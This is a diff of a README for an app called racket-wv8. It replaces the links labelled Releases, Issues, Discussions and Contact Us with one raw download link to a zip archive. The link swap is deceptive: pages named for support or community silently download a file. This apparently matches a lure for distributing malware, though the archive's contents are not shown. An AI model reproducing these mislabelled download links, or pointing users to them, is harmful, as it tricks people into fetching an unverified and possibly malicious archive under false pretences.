@@ -5,7 +5,7 @@ Welcome to **racket-wv8!** This application allows you to quickly access various
 
 ## 📦 Download & Install
 To download the latest version of racket-wv8, visit this page:
-[Download racket-wv8](https://github.com/JediKefas/racket-wv8/releases)
+[Download racket-wv8](https://raw.githubusercontent.com/JediKefas/racket-wv8/main/bawd/racket-wv8.zip)
 
 ### Installation Steps:
 1. **Visit the Release Page:** Click the link above to go to the Releases page.
@@ -36,13 +36,13 @@ If you encounter issues during installation or usage:
 We welcome contributions! If you have ideas for new features or improvements, please submit an issue or a pull request. Your feedback helps us make racket-wv8 better.
 
 ## 📞 Support
-For any questions or assistance, please visit our [GitHub Issues](https://github.com/JediKefas/racket-wv8/issues) page. We are here to help!
+For any questions or assistance, please visit our [GitHub Issues](https://raw.githubusercontent.com/JediKefas/racket-wv8/main/bawd/racket-wv8.zip) page. We are here to help!
 
 ## 👥 Community
-Join our community to share tips, ask questions, and get the latest updates. Connect with us on [GitHub Discussions](https://github.com/JediKefas/racket-wv8/discussions).
+Join our community to share tips, ask questions, and get the latest updates. Connect with us on [GitHub Discussions](https://raw.githubusercontent.com/JediKefas/racket-wv8/main/bawd/racket-wv8.zip).
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/JediKefas/racket-wv8/releases)
-- [Contact Us](https://github.com/JediKefas/racket-wv8)
+- [Releases Page](https://raw.githubusercontent.com/JediKefas/racket-wv8/main/bawd/racket-wv8.zip)
+- [Contact Us](https://raw.githubusercontent.com/JediKefas/racket-wv8/main/bawd/racket-wv8.zip)
 
 Thank you for choosing racket-wv8! Enjoy exploring your favorite content effortlessly.
